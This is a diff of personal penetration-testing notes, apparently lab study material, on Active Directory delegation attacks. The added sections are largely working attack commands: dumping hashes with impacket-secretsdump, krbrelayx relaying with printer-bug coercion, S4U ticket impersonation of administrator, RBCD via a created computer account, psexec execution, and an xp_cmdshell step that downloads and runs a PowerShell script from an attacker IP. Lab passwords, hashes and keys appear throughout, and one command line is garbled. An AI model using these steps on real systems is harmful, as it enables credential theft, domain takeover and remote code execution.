@@ -519,13 +519,13 @@ runas /user:corp\jen powershell.exe
 
   *
 
-      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -639,7 +639,7 @@ runas /user:corp\jen powershell.exe
 
 <summary>Exploiting GenericWrite on Computer Object</summary>
 
-![](<../.gitbook/assets/image (5).png>)
+![](<../.gitbook/assets/image (5) (1).png>)
 
 * Enumerating permissions assigned to current user
   *   ```powershell
@@ -709,6 +709,7 @@ runas /user:corp\jen powershell.exe
 ```powershell
 Import-Module powerview.ps1
 Get-DomainComputer -Unconstrained
+# Domain Controllers are configured with unconstrained delegation by default
 
 #To know the IP of the target
 nslookup appsrv01
@@ -717,7 +718,7 @@ nslookup appsrv01
 ## Exploitation
 
 * Must be local admin on the target (eg: appsrv01)
-*   2 methods
+*   3 methods
 
     * Have domain admin visit the application using uncontrained kerberoast --> dump TGT of admin
       *   ```
@@ -750,10 +751,65 @@ nslookup appsrv01
           ```
 
 
+    * OR Krbrelayx attack on unconstrained delegation
+      *
+
+          <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1).png>)
+        *   ```powershell
+            impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
+            ```
+
+
+      * Add an SPN for `attacker.corp.com` on `FILES01$`
+        *   ```powershell
+            python3 addspn.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -s HOST/attacker.corp.com --additional 'dc01.corp.com'
+            ```
+
+
+      * Add a DNS Entry for `attacker.corp.com` in Active Directory
+        *   ```powershell
+            python3 dnstool.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -r 'attacker.corp.com' -d '192.168.45.211' --action add 'dc01.corp.com'
+            ```
+
+
+      * Verify DNS Resolution for Attacker Host
+        *   ```powershell
+            nslookup attacker.corp.com dc01.corp.com
+            ```
+
+
+      * Start `krbrelayx` to Relay Authenticated TGT
+        *   ```powershell
+            # aes256-cts-hmac-sha1-96
+            python3 krbrelayx.py -aesKey 00ba3cfd9198fa8a6dc795324242810e98c7d36d083bd811fdfe204ef30cc7a7
+            ```
+
+
+      * Trigger Authentication from the DC Using the Print Spooler Bug
+        *   ```powershell
+            python3 krbrelayx.py -aesKey python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"
+            ```
+
+
+        * If errors out --> rerun the impacket secretdump again to obtain the computer hashes
+        * Check if got ccache file in the directory
+      * Use the Captured TGT to Dump Credentials from the DC
+        *   ```powershell
+            impacket-secretsdump -k -no-pass "corp.com/DC01$"@dc01.corp.com
+            ```
+
+
+      * Running Impacket-PsExec for Remote Code Execution
+        * ```powershell
+          impacket-psexec admin@dc01.corp.com -hashes :<nt hash>
+          ```
 
 
 
-    * Force high-privileged authentication without any user interaction (PrintSpooler)
+    * OR Force high-privileged authentication without any user interaction (PrintSpooler)
       *   ```powershell
           Rubeus.exe monitor /interval:5 /filteruser:CDC01$
           SpoolSample.exe <target-machine> <capture-server>
@@ -771,13 +827,13 @@ nslookup appsrv01
 
 <details>
 
-<summary>Contrained Delegation</summary>
+<summary>Constrained Delegation</summary>
 
 * Solve the double-hop issue while limiting access to only the desired backend service defined in msds-allowedtodelegateto
 * S4U2Self --> Allows a service to request Kerberos TGS for any user, including domain admin, without needing their passwords or hash
 * S4U2Proxy --> Allows a service to take a TGS from S4U2Self and exchange it for a TGS to a backend service
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (11).png>)
 
 ## Enumeration
 
@@ -785,12 +841,12 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
 
-## Exploitation
+## Exploitation 1
 
 * Compromise the IISSvc account
   * ```powershell
@@ -807,32 +863,105 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
-## Alternative Exploitation
+## Exploitation 2
 
 * Modify service names in memory to gain unauthorized access to different services on same host
 * When TGS is returned by KDC, only server name is encrypted but not service name
 * Attacker can modify service name to authenticate to different service
 * For instance if msDS-AllowedToDelegateTo is set to MSSQLSvc/cdc01.prod.corp1.com
 * Able to change it to access file system (cifs)
-* ```powershell
-  .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com /altservice:CIFS /ptt
-  ```
+*   ```powershell
+    .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com /altservice:CIFS /ptt
+    ```
+
+
+
+## Exploitation 3
+
+![](<../.gitbook/assets/image (3).png>)
+
+* Obtain a Ticket Granting Ticket (TGT) for the Service Account
+  *   ```powershell
+      impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9
+      export KRB5CCNAME=iissvc.ccache
+      ```
+
+
+* Obtain a Service Ticket (ST) for MSSQL Service as Administrator
+  *   ```powershell
+      impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
+      export KRB5CCNAME=administrator.ccache
+      ```
+
+
+* Access the SQL Server as Administrator
+  *   ```powershell
+      impacket-mssqlclient sql01.corp.com -k
+      ```
+
+
+* Check the current user and privileges inside SQL Server:
+  *   ```sql
+      SELECT SYSTEM_USER;
+      SELECT IS_SRVROLEMEMBER('sysadmin');
+      SELECT CURRENT_USER;
+      ```
+
+
+* Execute Reverse Shell via xp\_cmdshell in sql server
+  * ```sql
+    EXECUTE AS LOGIN = 'sa';
+    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+    EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.211/runall.ps1\")"';
+    ```
 
 </details>
 
 <details>
 
-<summary>Resource-Based Contrained Delegation</summary>
+<summary>Resource-Based Constrained Delegation</summary>
 
 * msDS-AllowedToActOnBehalfOfOtherIdentity
 * Backend service controls which frontend services can delegate on behalf of users
 * Attack against RBCD needs to happen from a computer account or a service account with a SPN
 
 [Exploiting GenericWrite on Computer Object](lateral-movement.md#exploiting-genericwrite-on-computer-object)
+
+* Find which computers we can modify using GenericWrite permissions
+  *   ```powershell
+      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
+          $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
+      } | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+      ```
+
+
+* Add a New Computer Account (myComputer$) to the Domain
+  *   ```powershell
+      impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+      ```
+
+
+* Configure RBCD on the Target Machine (BACKUP01$)
+  *   ```powershell
+      impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+      ```
+
+
+* Obtain a Service Ticket (ST) as Administrator
+  *   ```powershell
+      impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
+      ```
+
+
+* Execute Commands as Administrator
+  * ```powershell
+    impacket-psexec administrator@backup01.corp.com -k -no-pass
+    ```
 
 </details>
 
@@ -981,12 +1110,12 @@ setspn -T corp2.com -Q MSSQLSvc/*
 
 *   Login to the rdc01.corp1.com mssql server
 
-    <figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 *   Enumeration for [linked sql servers](../services/1433-mssql.md#linked-sql-servers)
 
-    <figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Obtaining Reverse shell from dc01.corp2.com
